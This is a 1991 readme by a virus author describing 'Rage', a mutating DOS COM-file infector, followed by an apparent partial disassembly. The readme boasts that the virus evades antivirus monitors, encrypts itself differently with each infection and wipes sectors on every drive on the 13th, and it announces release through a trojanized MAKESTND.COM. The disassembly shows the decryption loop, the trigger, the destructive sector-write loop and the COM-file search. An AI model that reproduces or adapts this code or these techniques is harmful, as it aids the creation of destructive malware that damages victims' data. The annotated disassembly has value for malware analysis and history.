                 ----------------------------------------------
                 Rage - Transient/Stealth/Mutating/COM Infector
                 ----------------------------------------------
                            Completed May 31, 1991
            Written by Data Disruptor with special thanks to Zodiac

 
 Order of Infection
 ------------------
    (1) Current directory
    (2) Root directory if no other files are found in (1)

 Stealth (???)
 -------------
    o Will detect the presence of FluShot+ and VirexPC. Will not execute
      under the influence of these utilities.
    
    (Due to the makeup of Norton's Disk Monitor, I was unable to find a 
     way to detect it at present time)

 Infection Size
 --------------
    o Infected files are increased by 575 bytes
    o Files under 2000 bytes will not be infected
    o Files over 63425 bytes will not be infected

 Randomizer Routine
 ------------------
    o Every time a file is infected, there is an approximate 1 in 16 chance
      that a message;

      "Pray for death - RABID '91"

      will be printed.

 Mutation
 --------
    o This virus encrypts itself differently every time it infects a file.

    (Note: It is quite easy to develop a scan string for this virus as the
     decryptor remains the same all the time. This will be remedied in
     version 1.1 by encrypting the decryptor... If you get what I'm saying)

 Destruction
 -----------
    o On the 13th of every month, Rage will clear the screen and display;

      "Rage - RABID Int'nl Development Corp. '91
       By Data Disruptor - Thanks to Zodiac"

      It will then attempt to format all drives starting from drive C: on
      through Z:, corrupting 255 sectors of each drive.

 Identification
 --------------
    o If you fear that you have infected yourself, simply search for the
      string;

      Patricia Boon

      which at no time is encrypted.

    (My girlfriend thinks that I don't write viruses, therefore, I said
     I'd prove to her that I do by putting her name in my next virus and
     "spread her name around the world...")

 Thoughts
 --------
    o Due to the appearance to the text "Patricia Boon", this virus will
      more than likely be called, "Patricia", but seeing as how there 
      allready, unnoficially, is a virus called "Patricia", this may end
          up being called "Patricia ][" or Flash Force's Nightmare name of
      "Boon".

    o Unless the virus-guru's successfully disassemble this virus, only
      then will the name "Rage" come out. (Fortunately, McAffe is good at
      that sort of thing)

 Final Note
 ----------
    o I am releasing the original virus in an infected MAKESTND.COM with
      filesize 3128 bytes. Run the program, then hit CTRL-BREAK to
      terminate.

---------------

 That about wraps up this readme. If you have any questions, reach me on The
G Spot.

                                Disruptor
                                RABID '91


Quick disassembly o

Startup code (20 bytes or so of solid code, for strings)

4273:0EF3 51             PUSH      CX
4273:0EF4 2E8B160101     MOV       DX,Word Ptr CS:[0101]
4273:0EF9 81C20301       ADD       DX,0103
4273:0EFD 8BF2           MOV       SI,DX                   ;DX = 0EF3
4273:0EFF 8BEA           MOV       BP,DX
4273:0F01 83C541         ADD       BP,+41
4273:0F04 90             NOP       
4273:0F05 55             PUSH      BP
4273:0F06 EB0D           JMP       0F15

Text message, not encrypted.

4273:0F07  50 61 74 72 69 63 69 61 20 42 6F 6F 6E          Patricia Boon           

Decryption loop

4273:0F20 B9FD01         MOV       CX,01FD

4273:0F23 8A24           MOV       AH,Byte Ptr [SI]
4273:0F25 51             PUSH      CX
4273:0F26 8AC8           MOV       CL,AL
4273:0F28 D2C4           ROL       AH,CL
4273:0F2A 59             POP       CX
4273:0F2B 8824           MOV       Byte Ptr [SI],AH
4273:0F2D FEC0           INC       AL
4273:0F2F 46             INC       SI
4273:0F30 E2F1           LOOP      0F23                    ;DECRYPT LOOP

Self check

4273:0F44 B80FFF         MOV       AX,FF0F                 ;ANYONE HOME?
4273:0F47 CD21           INT       21

Trigger

4273:0F51 B42C           MOV       AH,2C
4273:0F53 CD21           INT       21                      ;GET TIME

4273:0F55 80E20F         AND       DL,0F                   ;100TH
4273:0F58 0AD2           OR        DL,DL
4273:0F5A 750A           JNZ       0F66

4273:0F5C B409           MOV       AH,09         
4273:0F5E 8BD6           MOV       DX,SI
4273:0F60 81C21802       ADD       DX,0218                 ;"Pray...$"
4273:0F64 CD21           INT       21                      ;PRINT MESSAGE

4273:0F66 B42A           MOV       AH,2A
4273:0F68 CD21           INT       21                      ;GET DATE

4273:0F6A 80FA0D         CMP       DL,0D                   ;13TH ?
4273:0F6D 7523           JNZ       0F92

4273:0F6F 33C0           XOR       AX,AX                   ;VID MODE
4273:0F71 CD10           INT       10                      ;40 X 25

4273:0F73 B409           MOV       AH,09
4273:0F75 8BD6           MOV       DX,SI
4273:0F77 81C2CA01       ADD       DX,01CA                 ;"Rage...$"
4273:0F7B CD21           INT       21                      ;PRINT MESSAGE

4273:0F7D B80200         MOV       AX,0002                 ;C DRIVE
4273:0F80 B9FF00         MOV       CX,00FF                 ;256 SECTORS
4273:0F83 33D2           XOR       DX,DX                   ;START AT LOG 0
4273:0F85 50             PUSH      AX
4273:0F86 CD26           INT       26                      ;WRITE SECTORS
4273:0F88 9D             POPF      
4273:0F89 58             POP       AX
4273:0F8A 40             INC       AX                      ;NEXT DRIVE
4273:0F8B 3D1A00         CMP       AX,001A
4273:0F8E 72F0           JB        0F80
4273:0F90 EBEB           JMP       0F7D                    ;LOOP FOREVER


4273:0F98 03D6           ADD       DX,SI                   ;\*.COM

4273:0F9A B44E           MOV       AH,4E                   ;FIND 1ST
4273:0F9C B90600         MOV       CX,0006                 ;SYS HIDDEN
4273:0F9F CD21           INT       21

Host JMP stored

4273:10BA                                E9 53 0C 

Encrypted messages
                                                  52 61 67              Rag
4273:10C0  65 20 2D 20 52 41 42 49 44 20 49 6E 74 27 6E 6C e - RABID Int'nl
4273:10D0  20 44 65 76 65 6C 6F 70 6D 65 6E 74 20 43 6F 72  Development Cor
4273:10E0  70 2E 0D 0A 42 79 20 44 61 74 61 20 44 69 73 72 p...By Data Disr
4273:10F0  75 70 74 6F 72 20 2D 20 54 68 61 6E 6B 73 20 74 uptor - Thanks t
4273:1100  6F 20 5A 6F 64 69 61 63 0D 0A 24 50 72 61 79 20 o Zodiac..$Pray 
4273:1110  66 6F 72 20 64 65 61 74 68 20 2D 20 52 41 42 49 for death - RABI
4273:1120  44 20 27 39 31 0D 0A 24 5C 2A 2E 43 4F 4D 00 E9 D '91..$\*.COM..
